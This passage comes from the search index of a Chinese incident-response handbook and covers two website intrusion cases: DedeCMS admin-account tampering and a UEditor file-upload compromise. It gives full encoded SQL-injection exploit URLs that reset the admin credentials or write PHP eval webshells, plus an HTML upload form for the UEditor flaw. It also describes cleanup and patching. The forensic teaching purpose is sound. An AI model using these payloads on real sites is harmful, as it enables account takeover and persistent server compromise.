\u4f60\u662f\u67d0\u4e00\u4e2a\u7f51\u7ad9\u7684\u7ba1\u7406\u5458\uff0c\u6709\u4e00\u5929\uff0c\u4f60\u7684\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u767b\u5f55\u4e0d\u4e86\uff0c\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u770b\uff0c\u539f\u6765\u7ba1\u7406\u5458\u8d26\u53f7\u7528\u6237\u540d\u4e0d\u5b58\u5728\u4e86\uff0c\u5374\u591a\u4e86\u53e6\u5916\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\u540d\u3002\u4e0d\u5bf9\uff0c\u4e0d\u662f\u65b0\u589e\u4e86\u7ba1\u7406\u5458\uff0c\u800c\u662f\u4f60\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u88ab\u7be1\u6539\u4e86\u3002","title":"\u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9/#\u73b0\u8c61\u63cf\u8ff0","text":"\u524d\u540e\u7aef\u5206\u79bb\uff0c\u540e\u53f0\u53ea\u5141\u8bb8\u5185\u7f51\u8bbf\u95ee\uff0c\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u4f9d\u7136\u88ab\u591a\u6b21\u88ab\u7be1\u6539","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9/#\u95ee\u9898\u5904\u7406","text":"1\u3001\u7f51\u7ad9webshell \u5728\u9488\u5bf9\u7f51\u7ad9\u6839\u76ee\u5f55\u8fdb\u884cwebshell\u626b\u63cf\uff0c\u53d1\u73b0\u5b58\u5728\u811a\u672c\u6728\u9a6c\uff0c\u521b\u5efa\u65f6\u95f4\u4e3a2018-06-13 04:30:30 2\u3001 \u5b9a\u4f4dIP \u901a\u8fc7\u6728\u9a6c\u521b\u5efa\u65f6\u95f4\uff0c \u67e5\u770b\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5b9a\u4f4d\u5230IP\u4e3a\uff1a180.xx.xx.3 3\u3001\u5173\u8054\u5206\u6790 \u5168\u5c40\u641c\u7d22\u4e0e\u8be5IP\u6709\u5173\u7684\u64cd\u4f5c\u65e5\u5fd7\uff1a \u5728\u811a\u672c\u6728\u9a6c\u751f\u6210\u524d\uff0c\u6709\u4e24\u6761\u6bd4\u8f83\u53ef\u7591\u7684\u8bbf\u95ee\u65e5\u5fd7\u5438\u5f15\u4e86\u6211\u4eec\u7684\u6ce8\u610f\uff1a 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1\" 200 67 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/ad_js.php?aid=19 HTTP/1.1\" 200 32 \u5bf9\u8fd9\u6bb5POC\u8fdb\u884c\u89e3\u7801\uff0c\u6211\u4eec\u53d1\u73b0\u901a\u8fc7\u8fd9\u4e2apoc\u53ef\u4ee5\u5f80\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u6570\u636e\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u89e3\u7801\u540e\uff1a cfg_dbprefixmyad SET normbody = '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE aid` =19 # \u7efc\u4e0a\uff0c\u53ef\u4ee5\u63a8\u6d4b/plus/download.php\u4e2d\u53ef\u80fd\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u63a5\u4e0b\u6765\uff0c\u6536\u96c6\u7f51\u4e0a\u5df2\u516c\u5f00\u7684\u6709\u4ee5\u4e0b3\u79cdEXP\u8fdb\u884c\u6f0f\u6d1e\u590d\u73b0\u3002","title":"\u95ee\u9898\u5904\u7406"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC8%E7%AF%87%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%AF%A1%E6%94%B9/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5229\u7528\u65b9\u5f0f\u4e00\uff1a\u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458 1\u3001\u65b0\u5efa\u7ba1\u7406\u5458\u8d26\u53f7test/test123789\uff0c\u53ef\u4ee5\u6210\u529f\u767b\u5f55\u7f51\u7ad9\u540e\u53f0 2\u3001\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixadmin SETuserid='spider',pwd ='f297a57a5a743894a0e4' where id=19 #` \u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458\u4e3a\uff1a\u7528\u6237\u540dspider\uff0c\u5bc6\u7801admin\u3002 \uff083\uff09\u5bf9\u5e94\u7684EXP: \uff1fopen=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=97&arrs2[]=100&arrs2[]=109&arrs2[]=105&arrs2[]=110&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=117&arrs2[]=115&arrs2[]=101&arrs2[]=114&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=115&arrs2[]=112&arrs2[]=105&arrs2[]=100&arrs2[]=101&arrs2[]=114&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=96&arrs2[]=112&arrs2[]=119&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=102&arrs2[]=50&arrs2[]=57&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=97&arrs2[]=55&arrs2[]=52&arrs2[]=51&arrs2[]=56&arrs2[]=57&arrs2[]=52&arrs2[]=97&arrs2[]=48&arrs2[]=101&arrs2[]=52&arrs2[]=39&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=105&arrs2[]=100&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \u6267\u884cEXP\u540e\uff0c\u76f8\u5e94\u540e\u53f0\u6570\u636e\u5e93\u8868\u53d8\u4e3a\u5982\u4e0b\uff1a \uff084\uff09\u56e0\u6b64\u76f8\u5e94\u540e\u53f0\u767b\u5f55\u7528\u6237\u53d8\u4e3aspider\u5bc6\u7801admin \u5229\u7528\u65b9\u5f0f\u4e8c\uff1a\u901a\u8fc7/plus/mytag_js.php\u6587\u4ef6\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a `cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@\\','{dede:php}file_put_contents(''90sec.php'',''<?php eval($_POST[guige]);?>'');{/dede:php}') # @\\'`` \uff082\uff09\u5bf9\u5e94\u7684EXP: ?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=123&arrs2[]=47&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=39&arrs2[]=41&arrs2[]=32&arrs2[]=35&arrs2[]=32&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_mytag\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\uff0c \uff084\uff09\u6267\u884c\u5982\u4e0b\u8bed\u53e5\uff0c\u5728/plus\u76ee\u5f55\u4e0b\u751f\u621090sec.php\u4e00\u53e5\u8bdd\u6728\u9a6c http://www.xxxx.com/plus/mytag_js.php?aid=9013 \u5229\u7528\u65b9\u5f0f\u4e09\uff1a\u4f7f/plus/ad_js.php\u6587\u4ef6\u53d8\u4e3a\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixmyadSETnormbody= '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHEREaid =19 #` \uff082\uff09\u5bf9\u5e94\u7684EXP: /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \uff083\uff09\u6267\u884cEXP\u540e\uff0c\u5c06\u5411\u6570\u636e\u5e93\u8868dede_myad\u4e2d\u63d2\u5165\u4e00\u6761\u8bb0\u5f55\u3002 \uff084\uff09\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u5220\u9664\u7f51\u7ad9\u76ee\u5f55\u4e2d\u7684webshell 2\u3001\u6e05\u9664dede_myad\u3001dede_mytag\u6570\u636e\u5e93\u8868\u4e2d\u63d2\u5165\u7684SQL\u8bed\u53e5\uff0c\u9632\u6b62\u518d\u6b21\u88ab\u8c03\u7528\u751f\u6210webshell\u3002 \u5982\u4f55\u9632\u5fa1\uff1f \u7f51\u7ad9\u91c7\u7528\u5f00\u6e90CMS\u642d\u5efa\uff0c\u5efa\u8bae\u53ca\u65f6\u5bf9\u5b98\u65b9\u53d1\u5e03\u7684\u7cfb\u7edf\u8865\u4e01\u4ee5\u53ca\u5185\u6838\u7248\u672c\u8fdb\u884c\u5347\u7ea7\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC9%E7%AF%87%EF%BC%9A%E7%BC%96%E8%BE%91%E5%99%A8%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6/","text":"\u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6 \u00b6 UEditor\u662f\u767e\u5ea6\u7684\u4e00\u4e2ajavascript\u7f16\u8f91\u5668\u7684\u5f00\u6e90\u9879\u76ee\uff0c\u5f88\u591a\u5f00\u53d1\u4eba\u5458\u90fd\u559c\u6b22\u5f15\u7528\u8fd9\u4e2a\u7f16\u8f91\u5668\uff0c\u4f46\u8fd9\u4e2a\u7f16\u8f91\u5668\u5b98\u7f51\u7248\u672c\u4e00\u76f4\u505c\u7559\u57282016-05-26\uff0c\u5df2\u7ecf\u5f88\u4e45\u6ca1\u6709\u66f4\u65b0\u4e86\u3002 0x01 \u73b0\u8c61\u63cf\u8ff0 \u00b6 HIDS\u9884\u8b66\uff1a\u53d1\u73b0\u540e\u95e8(Webshell)\u6587\u4ef6\uff0c\u5efa\u8bae\u60a8\u7acb\u5373\u8fdb\u884c\u5904\u7406\u3002 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 1\u3001\u53d1\u73b0Webshell \u901a\u8fc7\u9884\u8b66\u4fe1\u606f\uff0c\u627e\u5230\u6728\u9a6c\u6587\u4ef6\u8def\u5f84\uff1a \u5907\u6ce8\uff1a\u7d27\u6025\u5904\u7406\uff0c\u901a\u8fc7\u7981\u6b62\u52a8\u6001\u811a\u672c\u5728\u4e0a\u4f20\u76ee\u5f55\u7684\u8fd0\u884c\u6743\u9650\uff0c\u4f7fwebshell\u65e0\u6cd5\u6210\u529f\u6267\u884c\u3002 2\u3001\u5b9a\u4f4d\u6587\u4ef6\u4e0a\u4f20\u65f6\u95f4 \u6839\u636eWebshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\uff0c2020\u5e743\u67089\u65e5 15:08:34 3\u3001 Web\u8bbf\u95ee\u65e5\u5fd7\u5173\u8054\u5206\u6790 \u7531\u4e8e\uff0cIIS\u65e5\u5fd7\u65f6\u95f4\u4e0e\u7cfb\u7edf\u65f6\u95f4\u76f8\u5dee8\u5c0f\u65f6\uff0c\u7cfb\u7edf\u65f6\u95f4\u662f15:08\uff0c\u6211\u4eec\u8fd9\u91cc\u67e5\u770b\u7684\u662f 7:08\u7684\u65e5\u5fd7\u65f6\u95f4\u3002 2020-03-09 07:08:34 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage ................... ................... 2020-03-09 07:08:35 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage \u627e\u5230\u5bf9\u5e94\u7684\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u9694\u95f4\u91cc\uff0c\u6211\u4eec\u4f1a\u6ce8\u610f\u5230\u8fd9\u6837\u4e24\u4e2aueditor\u7684\u8bbf\u95ee\u8bf7\u6c42\uff0c\u521d\u6b65\u6000\u7591\u662fUEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 4\u3001\u672c\u5730\u6f0f\u6d1e\u590d\u73b0 A\u3001\u672c\u5730\u6784\u5efa\u4e00\u4e2ahtml <form action=\"http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage\"enctype=\"application/x-www-form-urlencoded\" method=\"POST\"> <p>shell addr:<input type=\"text\" name=\"source[]\" /></p > <inputtype=\"submit\" value=\"Submit\" /> </form> B\u3001\u4e0a\u4f20webshell\uff0c\u4e0a\u4f20\u6210\u529f \u7ecf\u6f0f\u6d1e\u590d\u73b0\uff0c\u786e\u8ba4UEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 5\u3001\u8fd8\u539f\u653b\u51fb\u8005\u884c\u4e3a \u901a\u8fc7\u76f8\u5173\u6587\u4ef6\u7684\u8bbf\u95ee\u8bb0\u5f55\u8fdb\u884c\u5173\u8054\u5206\u6790\uff0c\u653b\u51fb\u8005\u901a\u8fc7 ueditor\u7f16\u8f91\u5668\u6210\u529f\u4e0a\u4f20webshell\u3002 0x03 \u4e8b\u4ef6\u5904\u7406 \u00b6 1\u3001 \u5220\u9664Webshell \u6e05\u695a\u5df2\u53d1\u73b0\u7684webshell\uff0c\u5e76\u5c1d\u8bd5\u67e5\u627e\u53ef\u80fd\u9690\u85cf\u7684webshell\u3002 2\u3001\u4ee3\u7801\u5b8c\u6574\u6027\u9a8c\u8bc1 \u6211\u4eec\u6765\u601d\u8003\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679c\u6709\u4e00\u4e2a\u514d\u6740\u7684Webshell\u9690\u85cf\u5728\u6570\u4ee5\u4e07\u884c\u7684\u4ee3\u7801\u4e2d\uff0c\u600e\u4e48\u641e\uff1f \u6587\u4ef6\u5b8c\u6574\u6027\u6821\u9a8c\uff0c\u68c0\u67e5\u7f51\u7ad9\u7684\u6e90\u7801\u662f\u5426\u88ab\u7be1\u6539\u8fc7\u3002 \u64cd\u4f5c\u8fc7\u7a0b\uff1a \u901a\u8fc7\u67e5\u770b\u670d\u52a1\u5668\u4e0a\u5df2\u90e8\u7f72\u7684\u6e90\u4ee3\u7801\u7248\u672c\uff0c\u627e\u7814\u53d1\u540c\u4e8b\u8981\u540c\u6837\u7248\u672c\u7684\u4ee3\u7801\u3002\u628a\u7eaf\u51c0\u6e90\u7801\u7684\u6240\u6709\u6587\u4ef6\u8ba1\u7b97\u4e00\u6b21hash\u503c\u4fdd\u5b58\uff0c\u518d\u5230\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u6b21hash\u503c\uff0c\u901a\u8fc7\u6bd4\u5bf9hash\u503c\uff0c\u8f93\u51fa\u65b0\u521b\u5efa\u7684/\u88ab\u4fee\u6539\u8fc7\u7684/\u5220\u9664\u7684\u6587\u4ef6\u5217\u8868\u3002 3\u3001\u7cfb\u7edf\u5165\u4fb5\u6392\u67e5 \u5bf9\u7cfb\u7edf\u505a\u4e00\u4e2a\u6574\u4f53\u6392\u67e5\uff0c\u786e\u8ba4\u662f\u5426\u5b58\u5728\u540e\u95e8 4\u3001\u4ee3\u7801\u4fee\u590d \u53cd\u9988\u7ed9\u76f8\u5173\u5f00\u53d1\u4eba\u5458\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002","title":"\u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC9%E7%AF%87%EF%BC%9A%E7%BC%96%E8%BE%91%E5%99%A8%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6/#\u7b2c9\u7bc7\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6","text":"UEditor\u662f\u767e\u5ea6\u7684\u4e00\u4e2ajavascript\u7f16\u8f91\u5668\u7684\u5f00\u6e90\u9879\u76ee\uff0c\u5f88\u591a\u5f00\u53d1\u4eba\u5458\u90fd\u559c\u6b22\u5f15\u7528\u8fd9\u4e2a\u7f16\u8f91\u5668\uff0c\u4f46\u8fd9\u4e2a\u7f16\u8f91\u5668\u5b98\u7f51\u7248\u672c\u4e00\u76f4\u505c\u7559\u57282016-05-26\uff0c\u5df2\u7ecf\u5f88\u4e45\u6ca1\u6709\u66f4\u65b0\u4e86\u3002","title":"\u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC9%E7%AF%87%EF%BC%9A%E7%BC%96%E8%BE%91%E5%99%A8%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6/#0x01-\u73b0\u8c61\u63cf\u8ff0","text":"HIDS\u9884\u8b66\uff1a\u53d1\u73b0\u540e\u95e8(Webshell)\u6587\u4ef6\uff0c\u5efa\u8bae\u60a8\u7acb\u5373\u8fdb\u884c\u5904\u7406\u3002","title":"0x01 \u73b0\u8c61\u63cf\u8ff0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC06%E7%AB%A0%EF%BC%9AWeb%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC9%E7%AF%87%EF%BC%9A%E7%BC%96%E8%BE%91%E5%99%A8%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6/#0x02-\u4e8b\u4ef6\u5206\u6790","text":"1\u3001\u53d1\u73b0Webshell \u901a\u8fc7\u9884\u8b66\u4fe1\u606f\uff0c\u627e\u5230\u6728\u9a6c\u6587\u4ef6\u8def\u5f84\uff1a \u5907\u6ce8\uff1a\u7d27\u6025\u5904\u7406\uff0c\u901a\u8fc7\u7981\u6b62\u52a8\u6001\u811a\u672c\u5728\u4e0a\u4f20\u76ee\u5f55\u7684\u8fd0\u884c\u6743\u9650\uff0c\u4f7fwebshell\u65e0\u6cd5\u6210\u529f\u6267\u884c\u3002 2\u3001\u5b9a\u4f4d\u6587\u4ef6\u4e0a\u4f20\u65f6\u95f4 \u6839\u636eWebshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\uff0c2020\u5e743\u67089\u65e5 15:08:34 3\u3001 Web\u8bbf\u95ee\u65e5\u5fd7\u5173\u8054\u5206\u6790 \u7531\u4e8e\uff0cIIS\u65e5\u5fd7\u65f6\u95f4\u4e0e\u7cfb\u7edf\u65f6\u95f4\u76f8\u5dee8\u5c0f\u65f6\uff0c\u7cfb\u7edf\u65f6\u95f4\u662f15:08\uff0c\u6211\u4eec\u8fd9\u91cc\u67e5\u770b\u7684\u662f 7:08\u7684\u65e5\u5fd7\u65f6\u95f4\u3002 2020-03-09 07:08:34 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage ................... ................... 2020-03-09 07:08:35 10.215.2.128 POST /ueditor/net/controller.ashx action=catchimage \u627e\u5230\u5bf9\u5e94\u7684\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u9694\u95f4\u91cc\uff0c\u6211\u4eec\u4f1a\u6ce8\u610f\u5230\u8fd9\u6837\u4e24\u4e2aueditor\u7684\u8bbf\u95ee\u8bf7\u6c42\uff0c\u521d\u6b65\u6000\u7591\u662fUEditor\u7f16\u8f91\u5668\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u3002 4\u3001\u672c\u5730\u6f0f\u6d1e\u590d\u73b0 A\u3001\u672c\u5730\u6784\u5efa\u4e00\u4e2ahtml <form action=\"http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage\"enctype=\"application/x-www-form-urlencoded\" method=\"POST\"> <p>shell addr:<input type=\"text\" name=\"source[]\" /></p > <inputtype=\"submit\" value=\"Submit\" /> </form> B\u3001\u4e0a\u4f20webshell\uff0c\u4e0a\u4f20\u6210\u529f 